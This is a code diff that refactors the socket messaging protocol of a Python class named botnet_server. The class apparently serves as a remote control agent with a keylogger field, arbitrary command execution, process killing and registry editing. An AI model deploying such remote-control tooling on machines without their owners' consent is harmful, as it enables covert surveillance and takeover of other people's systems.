@@ -5,15 +5,17 @@ import os
 import signal
 import subprocess
 from registry import registry
+import time
 
 class botnet_server:
 #-------------------PRIVATE AREA-------------------
     HOST = '127.0.0.1'  # The default server's hostname or IP address
     PORT = 26101  # The default port used by the server
     BUF_SIZE = 256
-    def __init__(self, host = HOST, port = PORT):
+    def __init__(self, host = HOST, port = PORT, buf_size = BUF_SIZE):
         self.host = host # server host IP
         self.port = port # server port
+        self.buf_size = buf_size
         # create new socket to listen
         self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.keylogger = None
@@ -40,10 +42,6 @@ class botnet_server:
         apps = str(data).split("\\r\\n")[3:-3]
         if (pid not in apps): 
             raise Exception
-            
-    def __get_msg(self):
-        data = self.nr.readline()
-        return data.strip()
     
     def __exec_cmd(self, cmd):
         try:
@@ -55,10 +53,11 @@ class botnet_server:
             self.conn.send(b"0")
     
     def __recv(self):
+        self.conn.send(b"1")
         size = int(self.nr.readline().strip())
         chunks = []
         while size > 0:
-            chunk = self.conn.recv(min(size, BUF_SIZE))
+            chunk = self.conn.recv(min(size, self.buf_size))
             if chunk == b'':
                 raise RuntimeError("socket connection broken")
             chunks.append(chunk)
@@ -66,8 +65,13 @@ class botnet_server:
         return b''.join(chunks)
     
     def __send(self, data):
+        self.conn.recv(1)
         self.nw.write(str(len(data)) + '\n'); self.nw.flush()
-        self.conn.sendall(data)   
+        self.conn.sendall(data)
+        
+    def __get_msg(self):
+        data = self.__recv()
+        return data.decode("utf-8")
             
 #-------------------PUBLIC AREA-------------------
     def listen_and_accept(self):
@@ -150,7 +154,7 @@ class botnet_server:
         for proc in procs:
             data = self.__parse(proc)
             for elem in data:
-                self.nw.write(str(elem) + '\n'); self.nw.flush()
+                self.__send(bytes(elem, "utf-8"))
     
     # kill process by pid
     def kill_process(self):
@@ -167,17 +171,17 @@ class botnet_server:
         # get list of process
         cmd = "powershell gps | where {$_.MainWindowTitle} | select Name,Id,@{Name='ThreadCount';Expression={$_.Threads.Count}}"
         data = subprocess.check_output(cmd)
-        procs = str(data).split("\\r\\n")[3:-3]
+        apps = str(data).split("\\r\\n")[3:-3]
 
         # send number of process
-        size = len(procs)
+        size = len(apps)
         self.nw.write(str(size) + '\n'); self.nw.flush()
 
         # send list of process
-        for proc in procs:
-            data = self.__parse(proc)
+        for app in apps:
+            data = self.__parse(app)
             for elem in data:
-                self.nw.write(str(elem) + '\n'); self.nw.flush()
+                self.__send(bytes(elem, "utf-8"))
         
     # kill application by pid
     def kill_app(self):
@@ -214,7 +218,6 @@ class botnet_server:
            
     # execute registry file from client
     def get_reg_text(self):
-        self.conn.sendall(b"1")
         data = self.__recv()
         with open("abc.reg", "wb") as f:
             f.write(data)
@@ -250,10 +253,4 @@ class botnet_server:
             key.delete_key("")
         else:
             raise RuntimeError
-            
-'''sv = botnet_server()
-sv.listen_and_accept()
-while True:
-    t = sv.response_msg()
-    if not t:
-        break'''
+        
